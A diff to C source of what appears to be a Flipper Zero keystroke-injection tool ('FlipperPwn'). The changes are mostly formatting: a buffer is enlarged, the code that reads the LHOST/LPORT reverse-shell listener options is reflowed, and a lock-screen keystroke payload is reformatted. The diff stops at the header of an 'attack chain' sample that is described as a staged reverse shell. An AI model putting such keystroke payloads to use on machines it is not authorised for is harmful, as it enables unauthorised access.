@@ -1074,7 +1074,7 @@ int32_t fpwn_payload_execute_thread(void* ctx) {
         const char* guide_path = EXT_PATH("flipperpwn/last_run.txt");
         File* gf = storage_file_alloc(app->storage);
         if(storage_file_open(gf, guide_path, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
-            char buf[256];
+            char buf[320];
             snprintf(
                 buf,
                 sizeof(buf),
@@ -1102,10 +1102,8 @@ int32_t fpwn_payload_execute_thread(void* ctx) {
             const char* lhost = NULL;
             const char* lport = NULL;
             for(uint8_t i = 0; i < module->option_count; i++) {
-                if(strcmp(module->options[i].name, "LHOST") == 0)
-                    lhost = module->options[i].value;
-                if(strcmp(module->options[i].name, "LPORT") == 0)
-                    lport = module->options[i].value;
+                if(strcmp(module->options[i].name, "LHOST") == 0) lhost = module->options[i].value;
+                if(strcmp(module->options[i].name, "LPORT") == 0) lport = module->options[i].value;
             }
             if(lhost && lport) {
                 snprintf(
@@ -1185,24 +1183,23 @@ static const char SAMPLE_SYSINFO[] =
     "ENTER\n";
 
 /* Lock Screen — locks the workstation */
-static const char SAMPLE_LOCK_SCREEN[] =
-    "NAME Lock Screen\n"
-    "DESCRIPTION Locks the workstation screen immediately\n"
-    "CATEGORY post\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION DELAY 500 \"Pre-lock delay (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "GUI l\n"
-    "PLATFORM MAC\n"
-    "DELAY {{DELAY}}\n"
-    "GUI SPACE\n"
-    "DELAY 700\n"
-    "STRING Lock Screen\n"
-    "ENTER\n"
-    "PLATFORM LINUX\n"
-    "DELAY {{DELAY}}\n"
-    "CTRL ALT l\n";
+static const char SAMPLE_LOCK_SCREEN[] = "NAME Lock Screen\n"
+                                         "DESCRIPTION Locks the workstation screen immediately\n"
+                                         "CATEGORY post\n"
+                                         "PLATFORMS WIN,MAC,LINUX\n"
+                                         "OPTION DELAY 500 \"Pre-lock delay (ms)\"\n"
+                                         "PLATFORM WIN\n"
+                                         "DELAY {{DELAY}}\n"
+                                         "GUI l\n"
+                                         "PLATFORM MAC\n"
+                                         "DELAY {{DELAY}}\n"
+                                         "GUI SPACE\n"
+                                         "DELAY 700\n"
+                                         "STRING Lock Screen\n"
+                                         "ENTER\n"
+                                         "PLATFORM LINUX\n"
+                                         "DELAY {{DELAY}}\n"
+                                         "CTRL ALT l\n";
 
 /* Attack Chain — recon + staged reverse shell + lock */
 static const char SAMPLE_ATTACK_CHAIN[] =
